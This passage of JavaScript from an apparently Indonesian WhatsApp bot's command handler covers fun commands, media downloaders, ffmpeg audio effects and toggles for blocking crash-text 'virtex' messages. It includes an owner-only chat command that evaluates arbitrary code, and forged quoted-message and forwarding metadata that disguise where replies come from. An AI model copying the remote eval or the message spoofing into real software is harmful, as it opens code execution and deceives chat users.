                    memberlimit = args[0]
                    reply(`memberlimit berhasil diubah menjadi ${memberlimit}`)
                    break
                    
                    case 'bts':
		if (!isRegistered) return reply(aml.noregis)
                    kontol = await getBuffer(`http://api.lolhuman.xyz/api/random/bts?apikey=${lolhuman}`)
                    aldi.sendMessage(from, kontol, image, { quoted: fkontak, caption: 'Plastiqnya Kaka:v'  })
                    break
                    case 'exo':
		if (!isRegistered) return reply(aml.noregis)
                    kontol = await getBuffer(`http://api.lolhuman.xyz/api/random/exo?apikey=${lolhuman}`)
                    aldi.sendMessage(from, kontol, image, { quoted: fkontak, caption: 'Plastiqnya Kaka:v' })
                    break
        case 'quotemaker':
		case 'makequote':
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
                    var gh = body.slice(12)
					var quote = gh.split("|")[0];
					var wm = gh.split("|")[1];
					if (args.length < 1) return reply(pref)
					reply (aml.wait)
					anu = await fetchJson(`https://terhambar.com/aw/qts/?kata=${quote}&author=${wm}&tipe=random`, {method: 'get'})
					kontol = await getBuffer(anu.result)
					aldi.sendMessage(from, kontol, image, {caption: 'Nih anjim', quoted: fkontak})
					await limitAdd(sender)
					break
				case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
			    case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} FvnkyStore`)
                    var gh = args.join('  ')
					var gh1 = gh.split("|")[0];
					var gh2 = gh.split("|")[1];
                    ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolhuman}&text1=${gh1}&text2=${gh2}`)
                    aldi.sendMessage(from, ini_anu, image, {quoted: fkontak})
                    break
              case 'online':
          case 'listonline':
          case 'here':
                if (!isGroup) return reply(`Only group`)
                let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
                let online = [...Object.keys(aldi.chats.get(ido).presences), aldi.user.jid]
                aldi.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
                    quoted: fkontak,
                    contextInfo: { mentionedJid: online }
                })
                break
        case 'truth':
		        if (!isRegistered) return reply(aml.noregis)
                const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
		        const ttrth = trut[Math.floor(Math.random() *   trut.length)]
		        truteh = await getBuffer(`https://i.ibb.co/tzPwWDH/20210402-203555.jpg`)
		        aldi.sendMessage(from, truteh, image, { caption: 'TRUTH\n\n'+ ttrth, quoted: fkontak })
		        break
		  case 'dare':
		            if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
		            if (isLimit(sender)) return reply(aml.limitend)
		            const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		            const der = dare[Math.floor(Math.random() *   dare.length)]
		            tod = await getBuffer(`https://i.ibb.co/SVbfCZY/20210402-203727.jpg`)
		            aldi.sendMessage(from, tod, image, { quoted: fkontak, caption: 'DARE\n\n'+ der })
		            break
		case 'ssweb':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Urlnya mana om')
					teks = body.slice(7)
					reply (aml.wait)
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/screenshotweb?url=${teks}`)
					kontol = await getBuffer(anu.gambar)
					aldi.sendMessage(from, kontol, image, {quoted: fkontak})
					await limitAdd(sender)
					break
          case 'pokemon':
                   if (!isRegistered) return reply(aml.noregis)
		           if (isBanned) return reply(aml.baned)
                   if (isLimit(sender)) return reply(aml.limitend)
                   if (!isGroup) return reply(aml.groupo)
                   if (!isNsfw) return reply(aml.nsfwoff)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=pokemon`, {method: 'get'})
					reply (aml.wait)
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() *   n.length)];
					pok = await getBuffer(nimek)
					aldi.sendMessage(from, pok, image, { quoted: fkontak })
					await limitAdd(sender)
					break
                case 'anjing':
                   if (!isRegistered) return reply(aml.noregis)
		           if (isBanned) return reply(aml.baned)
                   if (isLimit(sender)) return reply(aml.limitend)
                   if (!isGroup) return reply(aml.groupo)
                   if (!isNsfw) return reply(aml.nsfwoff)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=anjing`, {method: 'get'})
					reply (aml.wait)
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() *   n.length)];
					pok = await getBuffer(nimek)
					aldi.sendMessage(from, pok, image, { quoted: fkontak })
					await limitAdd(sender)
					break
					//ANTI VIRTEX BY aldi
				    case 'antivirtex':
					if (!isGroup) return reply(aml.groupo)					
					if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')					
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiFirtex) return reply('UDAH NYALA KAK')
						antifirtex.push(from)
						fs.writeFileSync('./database/group/antifirtex.json', JSON.stringify(antifirtex))
						reply('SUKSES MENGAKTIFKAN ANTI VIRTEX DI GROUP')
						aldi.sendMessage(from,`ALLERT!!! aldiARANG KIRIM VIRUS!!KARNA GRUP INI BERSIFAT ANTI VIRUS!!JIKA KIRIM VIRUS MAKA AKAN DI KICK!!`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiFirtex) return reply('EMANG AKTIF?')
						var ini = anti.botLangsexOf(from)
						antifirtex.splice(ini, 1)
						fs.writeFileSync('./database/group/antifirtex.json', JSON.stringify(antifirtex))
						reply('SUKSES MEMATIKAN ANTI VIRTEX DI GROUP')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					aldi.sendMessage(from, { quoted: fkontak})
					break
					case 'antialakazam':
					if (!isGroup) return reply(aml.groupo)					
					if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')					
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiFirtex2) return reply('UDAH NYALA KAK')
						antifirtex2.push(from)
						fs.writeFileSync('./database/group/antifirtex2.json', JSON.stringify(antifirtex2))
						reply('SUKSES MENGAKTIFKAN ANTI VIRTEX ALAKAZAM DI GROUP')
						aldi.sendMessage(from,`ALLERT!!! aldiARANG KIRIM VIRUS!!KARNA GRUP INI BERSIFAT ANTI VIRUS!!JIKA KIRIM VIRUS MAKA AKAN DI KICK!!`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiFirtex2) return reply('EMANG AKTIF?')
						var ini = anti.botLangsexOf(from)
						antifirtex2.splice(ini, 1)
						fs.writeFileSync('./database/group/antifirtex2.json', JSON.stringify(antifirtex2))
						reply('SUKSES MEMATIKAN ANTI VIRTEX ALAKAZAM DI GROUP')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					aldi.sendMessage(from, { quoted: fkontak})
					break
					case 'antixvirus':
					if (!isGroup) return reply(aml.groupo)					
					if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')					
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiFirtex3) return reply('UDAH NYALA KAK')
						antifirtex3.push(from)
						fs.writeFileSync('./database/group/antifirtex3.json', JSON.stringify(antifirtex3))
						reply('SUKSES MENGAKTIFKAN ANTI VIRTEX 𝐗-𝐕𝐢𝐫𝐮𝐬 DI GROUP')
						aldi.sendMessage(from,`ALLERT!!! aldiARANG KIRIM VIRUS!!KARNA GRUP INI BERSIFAT ANTI VIRUS!!JIKA KIRIM VIRUS MAKA AKAN DI KICK!!`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiFirtex3) return reply('EMANG AKTIF?')
						var ini = anti.botLangsexOf(from)
						antifirtex3.splice(ini, 1)
						fs.writeFileSync('./database/group/antifirtex3.json', JSON.stringify(antifirtex3))
						reply('SUKSES MEMATIKAN ANTI VIRTEX 𝐗-??𝐢𝐫𝐮𝐬 DI GROUP')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					aldi.sendMessage(from, { quoted: fkontak})
					break
					case 'antivirustebel':
					if (!isGroup) return reply(aml.groupo)					
					if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')					
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiFirtex4) return reply('UDAH NYALA KAK')
						antifirtex4.push(from)
						fs.writeFileSync('./database/group/antifirtex4.json', JSON.stringify(antifirtex4))
						reply('SUKSES MENGAKTIFKAN ANTI VIRTEX ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ DI GROUP')
						aldi.sendMessage(from,`ALLERT!!! aldiARANG KIRIM VIRUS!!KARNA GRUP INI BERSIFAT ANTI VIRUS!!JIKA KIRIM VIRUS MAKA AKAN DI KICK!!`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiFirtex4) return reply('EMANG AKTIF?')
						var ini = anti.botLangsexOf(from)
						antifirtex4.splice(ini, 1)
						fs.writeFileSync('./database/group/antifirtex4.json', JSON.stringify(antifirtex4))
						reply('SUKSES MEMATIKAN ANTI VIRTEX ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ DI GROUP')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					aldi.sendMessage(from, { quoted: fkontak})
					break
					case 'anticollosal':
					if (!isGroup) return reply(aml.groupo)					
					if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')					
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiFirtex5) return reply('UDAH NYALA KAK')
						antifirtex5.push(from)
						fs.writeFileSync('./database/group/antifirtex5.json', JSON.stringify(antifirtex5))
						reply('SUKSES MENGAKTIFKAN ANTI VIRTEX 𝐂𝐎𝐋𝐎𝐒𝐒𝐀𝐋 𝐓𝐈??𝐀𝐍 DI GROUP')
						aldi.sendMessage(from,`ALLERT!!! aldiARANG KIRIM VIRUS!!KARNA GRUP INI BERSIFAT ANTI VIRUS!!JIKA KIRIM VIRUS MAKA AKAN DI KICK!!`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiFirtex5) return reply('EMANG AKTIF?')
						var ini = anti.botLangsexOf(from)
						antifirtex5.splice(ini, 1)
						fs.writeFileSync('./database/group/antifirtex5.json', JSON.stringify(antifirtex5))
						reply('SUKSES MEMATIKAN ANTI VIRTEX 𝐂𝐎𝐋𝐎𝐒𝐒??𝐋 𝐓𝐈𝐓𝐀𝐍 DI GROUP')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					aldi.sendMessage(from, { quoted: fkontak})
					break
					case 'antiviruschina':
					if (!isGroup) return reply(aml.groupo)					
					if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')					
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiFirtex6) return reply('UDAH NYALA KAK')
						antifirtex6.push(from)
						fs.writeFileSync('./database/group/antifirtex6.json', JSON.stringify(antifirtex6))
						reply('SUKSES MENGAKTIFKAN ANTI VIRTEX ♚㜸ཽཽࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ͢͢㜺ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ㜸ཽཽཽ͢͢͢♚ DI GROUP')
						aldi.sendMessage(from,`ALLERT!!! aldiARANG KIRIM VIRUS!!KARNA GRUP INI BERSIFAT ANTI VIRUS!!JIKA KIRIM VIRUS MAKA AKAN DI KICK!!`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiFirtex6) return reply('EMANG AKTIF?')
						var ini = anti.botLangsexOf(from)
						antifirtex6.splice(ini, 1)
						fs.writeFileSync('./database/group/antifirtex6.json', JSON.stringify(antifirtex6))
						reply('SUKSES MEMATIKAN ANTI VIRTEX ♚㜸ཽཽࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ͢͢㜺ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ㜸ཽཽཽ͢͢͢♚ DI GROUP')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					aldi.sendMessage(from, { quoted: fkontak})
					await limitAdd(sender)
					break
		//MUSIC & MEDIA
		case 'chord':
		        if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
		        if (isLimit(sender)) return reply(aml.limitend)
                anu = await fetchJson(`https://tobz-api.herokuapp.com/api/chord?q=${body.slice(7)}&apikey=${TobzKey}`)
                aldi.sendMessage(from, anu.result, text, {quoted: fkontak})
                break
       case 'nightcore':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await aldi.downloadAndSaveMediaMessage(encmedia)
					reply (aml.wait)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=441001.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						aldi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:false, quoted: odc,duration:99999999999999999999999})
						fs.unlinkSync(ran)
					   })
				       break 
				case 'slow':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await aldi.downloadAndSaveMediaMessage(encmedia)
					reply (aml.wait)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						aldi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fkontak})
						fs.unlinkSync(ran)
					    })
				        break
				case 'tupai':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await aldi.downloadAndSaveMediaMessage(encmedia)
					reply (aml.wait)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						aldi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fkontak})
						fs.unlinkSync(ran)
					    })
				       break
				case 'blub':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await aldi.downloadAndSaveMediaMessage(encmedia)
					reply (aml.wait)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						aldi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fkontak})
						fs.unlinkSync(ran)
					    })
				        break
				case 'gemuk':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await aldi.downloadAndSaveMediaMessage(encmedia)
					reply (aml.wait)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						aldi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fkontak})
						fs.unlinkSync(ran)
					    })
				        break
				case 'ghost':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await aldi.downloadAndSaveMediaMessage(encmedia)
					reply (aml.wait)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						aldi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fkontak})
						fs.unlinkSync(ran)
					    })
				       break
		       case 'bass':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await aldi.downloadAndSaveMediaMessage(encmedia)
					reply (aml.wait)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=64:width_type=o:width=2:g=56 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						aldi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true,  quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} } } })
						fs.unlinkSync(ran)
					   })
				       break
                  case 'tiktok':
		             if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    list = [{title: `Mau dikirim Audio Apa Video bang`,
                    rows: [
                       {
                        title: `Audio/Mp3`,
                        description: `*Sedang Maintenance`,
                        rowId: `${prefix}ttmp3 ${args[0]}`
                      },{
                     	title: `Audio/Mp4`,
                        description: `*No watermark*`,
                        rowId: `${prefix}tt5 ${args[0]}`
                      },{
                        title: `Video/Mp4`,
                        description: `*Sedang Maintenance*`,
                        rowId: `${prefix}ttmp4 ${args[0]}`
                      }
                    ]
                   }]
               listmsg(from, `Tik Tok Downloader`, `Pilih Ekstensi Anda Disini????`, list)
               break
               case prefix+'eval':
            const q = args.join(' ')
            if (!isOwner) return aldi.reply(from, 'Perintah ini hanya bisa di gunakan oleh Owner Aldii', id)
            if (!q) return aldi.reply(from, 'Harap masukkan code JavaScript!', id)
            try {
                let evaled = await eval(q)
                if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                tobz.sendText(from, evaled)
            } catch (err) {
                aldi.reply(from, err, id)
            }
        break
                 case 'ttmp4':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(aml.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(aml.wait)
hx.ttdownloader(lin).then(res => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = fs.readFileSync('stik/thumb.jpeg')
aldi.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP4*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync('stik/fake.jpeg','base64'), contextInfo:{forwardingScore: 989, isForwarded: true}})
aldi.sendMessage(from, anu, 'Done!')
})
break
case 'ttmp3':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(aml.wait)
hx.ttdownloader(lin).then(res => {
console.log('[ TIKTOK ] downloader')
anu = res.audio
fto = fs.readFileSync('stik/thumb.jpeg')
aldi.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP3*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync('stik/fake.jpeg','base64'), contextInfo:{forwardingScore: 989, isForwarded: true}})
aldi.sendMessage(from, anu, 'Done!')
})
		     		break
                case 'ytdl':             
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    list = [{title: `Mau dikirim Audio Apa Video bang`,
                    rows: [
                       {
                        title: `Audio/Mp3`,
                        description: `*Bot akan mengirimkan dalam bentuk ekstensi .mp3*`,
                        rowId: `${prefix}yt3 ${args[0]}`
                      },{
                        title: `Video/Mp4`,
                        description: `*Bot akan mengirimkan dalam bentuk ekstensi .mp4 (video)*`,
                        rowId: `${prefix}yt4 ${args[0]}`
                      }
                    ]
                   }]
               listmsg(from, `Youtube Downloader`, `Pilih Ekstensi Anda Disini👇👇`, list)
               break              
                    case 'yt3':
                    if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                       if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
				       let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
		               if (!isLinks) return reply('Link Nya Tidak Valid Kak')
					   try {
					   reply(aml.wait)
					   yta(args[0])
			          .then((res) => {
					   const { dl_link, thumb, title, filesizeF, filesize } = res
					   axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`) 
					   .then(async (res) => {
						const captions = `────────────────────\n◪ *YOUTUBE MP3*\n│\n└ ❏ *Title* : ${title}\n❏ *Ext* : MP3\n❏ *Size* : ${filesizeF}\n────────────────────\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
						var buffimg = await getBuffer(thumb)
                        var bufflgi = await getBuffer(dl_link)
                        aldi.sendMessage(from, buffimg, image, {caption: captions})
                        await aldi.sendMessage(from, bufflgi, audio).catch(() => reply('error'))
						})
						})
						} catch (err) {
						reply('Maaf Kak, sedang eror.....')   
						}
						break
          case 'tt5':
		 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(aml.Iv)
		 		if (!q) return reply('Linknya?')
		 		reply(aml.wait)
				tik.ssstik(`${args[0]}`)
		    		.then(result => {
		    		console.log(result)
		    		const { videonowm, videonowm2, text } = result
		    		axios.get(`https://tinyurl.com/api-create.php?url=${videonowm2}`)
		    		.then(async (a) => {
		    		me = `*Title* : ${text}\n*Link* : ${a.data}`
				aldi.sendMessage(from,{url:`${videonowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
				})
				})
		     		.catch(e => console.log(e))
		     		break
                    case 'yt4':
                    if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)          
                       if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
					   let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
					   if (!isLinks2) return reply('Link Nya Tidak Valid Kak')
					   try {
					   reply(aml.wait) 
					   ytv(args[0])
					   .then((res) => {
					   const { dl_link, thumb, title, filesizeF, filesize } = res
					   axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
					   .then(async(a) => {
						//if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YOUTUBE MP4*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
						const captionsYtmp4 = `────────────────────\n◪ *YOUTUBE MP4*\n│\n└ ❏ *Title* : ${title}\n❏ *Ext* : MP4\n❏ *Size* : ${filesizeF}\n────────────────────\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
						var buffimg = await getBuffer(thumb)
                        var bufflgi = await getBuffer(dl_link)
                        aldi.sendMessage(from, buffimg, image, {caption: captionsYtmp4})
                        await aldi.sendMessage(from, bufflgi, video).catch(() => reply('error'))
						})		
						})
						} catch (err) {
					    reply('Maaf Kak, sedang eror.....')   
						}
						break
                 case 'play':
                if (!isRegistered) return reply(aml.noregis)
                if (isLimit(sender)) return reply(aml.limitend)
                if (isBanned) return reply(aml.baned)            
                if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh : ${prefix + command} mekukis Senja`)
			        reply(aml.wait)
    		        aramas = await yts(q);
    		        aramat = aramas.all 
   			        var mulaikah = aramat[0].url							
                    try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        // if (Number(filesize) >= 100000) return aldi.sendMediaURL(from, thumb, `「 PLAY MUSIC 」\n\n*Title* : ${title}\n*Ext* : mp3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                        const captions = `「 PLAY MUSIC 」\n\n*Title* : ${title}\n*Ext* : mp3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        var buffimg = await getBuffer(thumb)
                        var bufflgi = await getBuffer(dl_link)
                        aldi.sendMessage(from, buffimg, image, {caption: captions})
